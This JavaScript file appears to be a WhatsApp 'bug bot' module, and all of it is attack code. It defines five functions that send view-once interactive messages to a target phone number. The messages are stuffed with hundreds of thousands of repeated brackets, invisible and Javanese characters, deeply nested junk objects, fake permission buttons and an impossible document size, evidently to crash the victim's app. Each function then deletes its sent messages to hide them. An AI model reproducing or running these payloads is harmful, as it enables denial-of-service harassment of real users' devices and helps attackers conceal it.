async function RevaFc(target) {
  console.log(chalk.red(`Sending Bug To ${target}` ));
let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "͟Flayy Official",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[{{]]".repeat(200000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(200000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(200000),
          }, 
        },
      },
    },
  };
  
  const [msg, msg2] = await Promise.all([
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg } }),
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg2 } })
  ]);
}

async function FcDell(target) {
  console.log(chalk.red(`Sending Bug To ${target}`));

  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "FlayyOfficial" + "".repeat(5000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            messageParamsJson: "{[{{".repeat(5000) + "".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000) + "".repeat(5000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + "".repeat(5000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + "".repeat(5000),
              },
              {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ cameraAccess: true }) + "".repeat(5000),
              },
              ...Array.from({ length: 10 }, () => ({
                name: "single_select",
                buttonParamsJson: "{[{{".repeat(1000) + "".repeat(2000),
              }))
            ],
            messageParamsJson: "{[{{".repeat(5000) + "".repeat(10000), // Repeated
          },
        },
      },
    },
  };

  const [flayy, reva] = await Promise.all([ 
   sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: flayy } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: reva } })
  ]);
}
        
 async function PayloadInvis(target) {
  console.log(chalk.red(`Sending Bug To ${target}` ));
  
  const LanggXzzzz = JSON.stringify({
    status: true,
    criador: "Flayy",
    timestamp: Date.now(),
    noise: "}".repeat(1000000),
    resultado: {
      type: "md",
      dummyRepeat: Array(100).fill({
        id: "Letalis Kill Youu🗡️🗡️" + Math.random(),
        message: "\u200f".repeat(5000),
        crash: {
          deepLevel: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    level5: {
                      loop: Array(50).fill("🪷".repeat(500))
                    }
                  }
                }
              }
            }
          }
        }
      }),
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: -98411,
        _maxListeners: Infinity,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: new Array(500).fill([99, 99, 99]),
          browser: new Array(100).fill(["Chrome", "Linux"]),
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 100,
          keepAliveIntervalMs: 10,
          logger: {
            logs: Array(1000).fill("Flayy Kill Youu🗡️🗡️")
          },
          spam: Array(1000).fill("🪺").join(""),
          auth: { Object: "authData" },
          crashTrigger: {
            nullField: null,
            undefinedField: undefined,
            boolSwitch: [true, false, false, true, null],
            crazyArray: new Array(10000).fill(Math.random())
          },
          mobile: true
        }
      }
    }
  });

  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "͟FlayyOfficial"
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"]
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(200000),
            buttonParamsJson: JSON.stringify({ status: true }) + LanggXzzzz +
              JSON.stringify({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + LanggXzzzz
              })
          }
        }
      }
    }
  };

  const [msg, msg2] = await Promise.all([
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg2 } })
  ]);
}

async function FcDellPayload(target) {
  console.log(chalk.red(`Sending Bug To ${target}`));
  
  const LanggXzzzz = JSON.stringify({
    status: true,
    criador: "Flayy Official",
    timestamp: Date.now(),
    noise: "}".repeat(500000),
    resultado: {
      type: "md",
      dummyRepeat: Array(100).fill({
        id: "Letalis Kill Youu🗡️🗡️" + Math.random(),
        message: "\u0000".repeat(5000),
        crash: {
          deepLevel: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    level5: {
                      loop: Array(50).fill("🪷".repeat(500))
                    }
                  }
                }
              }
            }
          }
        }
      }),
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: -98411,
        _maxListeners: Infinity,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: new Array(500).fill([99, 99, 99]),
          browser: new Array(100).fill(["Chrome", "Linux"]),
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 100,
          keepAliveIntervalMs: 10,
          logger: {
            logs: Array(1000).fill("Flayy Kill Youu🗡️🗡️")
          },
          spam: Array(1000).fill("🪺").join(""),
          auth: { Object: "authData" },
          crashTrigger: {
            nullField: null,
            undefinedField: undefined,
            boolSwitch: [true, false, false, true, null],
            crazyArray: new Array(10000).fill(Math.random())
          },
          mobile: true
        }
      }
    }
  });

  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "͟FlayyOfficial"
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"]
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(15000),
            buttonParamsJson:
              JSON.stringify({ status: true }) + LanggXzzzz +
              JSON.stringify({
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true }) + LanggXzzzz
              }),
            messageParamsJson: "{[{{".repeat(15000) + "".repeat(12000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(15000) + "".repeat(12000)
              }
            ]
          }
        }
      }
    }
  };

  const [msg, msg2] = await Promise.all([
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: msg2 } })
  ]);
}    

async function RevaFC2(target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
              text: "⃟Flayy Is Here",
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileLength: "9999999999999999",
              pageCount: 9999999999999999,
              fileName: " ӄǟʏʟǟ ɛʍքɨʀɛ ",
              directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
              mediaKeyTimestamp: "1715880173",
              contactVcard: true
            }
          },nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          }
        }
      }
    }
  };

  const [flayy, reva] = await Promise.all([
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: flayy } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: reva } })
  ]);
}